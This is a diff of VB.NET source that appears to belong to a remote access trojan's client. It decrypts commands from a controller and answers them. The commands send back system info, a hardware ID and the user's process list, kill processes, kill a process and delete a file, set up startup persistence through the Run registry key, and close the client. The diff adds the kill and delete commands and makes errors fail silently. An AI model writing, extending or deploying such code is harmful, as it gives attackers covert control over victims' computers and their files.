@@ -110,22 +110,42 @@ cc:
     End Sub
 
     Public Shared Sub Data(ByVal b As Byte())
+        On Error Resume Next
         Dim A As String() = Split(AES_Decrypt(BS(b)), SPL)
 
-        Try
-            Select Case A(0)
+
+        Select Case A(0)
                 Case "Sysinfo"
                     Send("SysInfo" + SPL + ID.Getsystem + SPL + HWID)
 
                 Case "PROC"
-                    Dim PR As String = String.Empty
-                    Dim PR_LIST As Process() = Process.GetProcesses()
-                    For Each P As Process In PR_LIST
-                        Try : PR += P.ProcessName & "|'P'|" & P.Id & "|'P'|" & P.MainModule.FileName & "|'P'|" : Catch : End Try ' file |'p'| 1 |'p'| c:/file.exe |'p'|
-                    Next
-                    Send("PROC" + SPL + PR + SPL + Windows.Forms.Application.ExecutablePath + SPL + HWID)
+                Dim L As String = ""
+                Dim searcher As New Management.ManagementObjectSearcher("Select * from Win32_Process")
+                Dim processList As Management.ManagementObjectCollection = searcher.Get()
+                For Each obj As Management.ManagementObject In processList
+                    Dim owner = {""}
+                    Dim returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", owner))
+                    If returnVal = 0 Then
+                        If owner(0) = Environment.UserName Then
+                            L += obj.Item("Name") & "|'P'|" & obj.Item("ProcessId") & "|'P'|" & obj.Item("ExecutablePath") & "|'P'|" ' file |'p'| 1 |'p'| c:/file.exe |'p'|
+                        End If
+                    End If
+                Next
+                Send("PROC" + SPL + L + SPL + Windows.Forms.Application.ExecutablePath + SPL + HWID)
 
-                Case "STUP" 'credit ĦΔĆҜƗŇǤ ŞØØƒ
+                Case "PROCKILL"
+                Dim PR As Process
+                PR = Process.GetProcessById(A(1).ToString)
+                PR.Kill()
+
+            Case "PROCDEL"
+                Dim PR As Process
+                PR = Process.GetProcessById(A(1).ToString)
+                PR.Kill()
+                Threading.Thread.Sleep(2000)
+                IO.File.Delete(A(2))
+
+            Case "STUP" 'credit ĦΔĆҜƗŇǤ ŞØØƒ
 
                     'HKEY_CURRENT_USER_Run
                     Dim MyKey1 As String = "Software\Microsoft\Windows\CurrentVersion\Run\"
@@ -260,9 +280,6 @@ cc:
                 Case "Close"
                     CloseMe()
             End Select
-
-        Catch ex As Exception
-        End Try
 
     End Sub
 
